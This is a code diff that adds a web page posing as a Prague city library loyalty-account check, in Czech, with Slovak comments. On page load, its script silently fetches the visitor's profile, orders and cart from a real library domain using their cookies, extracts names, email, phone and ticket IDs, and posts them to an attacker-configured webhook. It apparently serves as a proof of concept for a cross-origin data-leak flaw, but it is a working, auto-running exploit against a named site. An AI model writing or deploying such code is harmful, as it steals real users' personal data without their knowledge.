@@ -1,10 +1,119 @@
 <!DOCTYPE html>
-<html lang="sk">
+<html lang="cs">
 <head>
-<meta charset="UTF-8">
-<title>Moja Stránka</title>
+<meta charset="utf-8">
+<title>Městská knihovna Praha — Věrnostní program</title>
+<style>
+body{font-family:Arial,sans-serif;max-width:700px;margin:40px auto;padding:20px;background:#f5f5f5}
+.card{background:#fff;border-radius:8px;padding:30px;box-shadow:0 2px 8px rgba(0,0,0,.1);text-align:center}
+h1{color:#1a5276}
+.spinner{border:4px solid #f3f3f3;border-top:4px solid #1a5276;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}
+@keyframes spin{to{transform:rotate(360deg)}}
+.hidden{display:none}
+#result{text-align:left;background:#f8f9fa;padding:15px;border-radius:5px;font-family:monospace;font-size:13px;white-space:pre-wrap;margin-top:20px}
+.tag{display:inline-block;background:#e74c3c;color:#fff;padding:2px 8px;border-radius:3px;font-size:11px;margin-bottom:10px}
+</style>
 </head>
 <body>
-<h1>Ahoj, toto je môj web!</h1>
+<div class="card">
+    <h1>📚 Městská knihovna Praha</h1>
+    <p>Ověřování věrnostního účtu...</p>
+    <div class="spinner" id="spinner"></div>
+    <p id="status">Načítání...</p>
+    <div id="result" class="hidden"></div>
+</div>
+
+<script>
+// ══════════════════════════════════════════════════════════
+// KONFIGURÁCIA — nastav pred deployom:
+const WEBHOOK = "WEBHOOK_URL_SEM";  // https://webhook.site/tvoj-uuid
+// ══════════════════════════════════════════════════════════
+
+const TARGET = "https://kultura.mlp.cz";
+
+async function steal() {
+    const status = document.getElementById("status");
+    const result = document.getElementById("result");
+    const spinner = document.getElementById("spinner");
+    
+    const stolen = {
+        timestamp: new Date().toISOString(),
+        attacker_origin: window.location.origin,
+        victim_data: {}
+    };
+
+    try {
+        // 1. Profil
+        status.textContent = "Ověřování účtu...";
+        const r1 = await fetch(TARGET + "/mkp/General/MyAccount/Registration", {credentials: "include"});
+        const html1 = await r1.text();
+
+        const fields = {
+            jmeno:    html1.match(/inputName"[^>]*value="([^"]*)"/) ,
+            prijmeni: html1.match(/inputSurname"[^>]*value="([^"]*)"/),
+            email:    html1.match(/registrationEmail"[^>]*value="([^"]*)"/),
+            telefon:  html1.match(/inputPhone"[^>]*value="([^"]*)"/),
+        };
+        const nav = html1.match(/login__user-name[^>]*>\s*([^<]+)/);
+        const emails = html1.match(/[\w.-]+@[\w.-]+\.\w+/g);
+
+        stolen.victim_data.logged_as = nav ? nav[1].trim() : "";
+        for (const [k, m] of Object.entries(fields)) {
+            stolen.victim_data[k] = m ? m[1] : "";
+        }
+        stolen.victim_data.emails_found = emails ? [...new Set(emails)] : [];
+        stolen.victim_data.profile_size = html1.length;
+
+        // 2. Objednávky
+        status.textContent = "Načítání objednávek...";
+        const r2 = await fetch(TARGET + "/mkp/General/MyAccount?mrsid=1", {credentials: "include"});
+        const html2 = await r2.text();
+        const orders = [...new Set([...html2.matchAll(/orderId[^>]*?(\d+)/g)].map(m => m[1]))];
+        stolen.victim_data.order_ids = orders;
+
+        // 3. Košík
+        status.textContent = "Načítání košíku...";
+        const r3 = await fetch(TARGET + "/mkp/standard/Cart/Index?mrsid=1", {credentials: "include"});
+        const html3 = await r3.text();
+        const total = html3.match(/value:\s*(\d+)/);
+        const tickets = [...html3.matchAll(/Cart\/Delete\/(\d+)/g)].map(m => m[1]);
+        stolen.victim_data.cart_total = total ? total[1] + " Kč" : "prázdný";
+        stolen.victim_data.cart_tickets = tickets;
+
+        // 4. Odoslanie na webhook
+        if (WEBHOOK && WEBHOOK !== "WEBHOOK_URL_SEM") {
+            await fetch(WEBHOOK, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify(stolen),
+                mode: "no-cors"
+            });
+            stolen.exfiltrated_to = WEBHOOK;
+        }
+
+        // 5. Zobrazenie na stránke
+        spinner.style.display = "none";
+        const hasData = stolen.victim_data.logged_as || stolen.victim_data.email;
+
+        if (hasData) {
+            status.innerHTML = '<span style="color:#e74c3c;font-weight:bold">⚠️ Vaše údaje byly přečteny z cizí domény!</span>';
+        } else {
+            status.innerHTML = '<span style="color:#f39c12">Session anonymní (cookie partitioning aktivní)</span>';
+        }
+
+        result.classList.remove("hidden");
+        result.innerHTML = '<span class="tag">EXFILTROVANÁ DATA</span>\n' + JSON.stringify(stolen, null, 2);
+
+    } catch (e) {
+        spinner.style.display = "none";
+        status.innerHTML = '<span style="color:#27ae60">✅ CORS zablokován prohlížečem</span>';
+        result.classList.remove("hidden");
+        result.textContent = "Error: " + e.message;
+    }
+}
+
+// Auto-run pri načítaní stránky = ONE CLICK (návšteva stránky)
+window.addEventListener("load", steal);
+</script>
 </body>
 </html>
